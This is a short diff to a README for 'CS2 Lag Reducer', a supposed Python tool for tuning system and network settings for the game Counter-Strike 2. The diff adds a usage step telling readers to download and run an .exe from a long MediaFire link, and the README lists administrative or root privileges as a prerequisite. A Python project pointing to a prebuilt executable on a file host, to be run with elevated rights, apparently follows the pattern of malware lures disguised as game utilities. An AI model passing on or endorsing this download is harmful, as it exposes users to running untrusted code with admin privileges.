@@ -26,4 +26,5 @@ CS2 Lag Reducer is a Python script designed to optimize system and network setti
 - Administrative or root privileges (required for system and network modifications)
 
 ## Usage
- **Download the script** and run the `exe` file
+ **Download the script** and run the `exe` file:
+ `https://download1321.mediafire.com/e6i4sla0nhsgu9_MHXFsoOkEj8Xa9WmPsmVIg7o2czfIU2KJtIudOCMM-WjbT0kaFyTUviR2jP_gTWG8yVQtDem3o6rEWEW2lXjE3gEDcX4HDvEtpSEYDWlrhjaL1jbjs7nHwmCsh61asKfgiJ6gFtMVyguVpAz3IuAgEGzhGA/olfxyn2zog3vox8/Cs2Lagreducermain.exe`
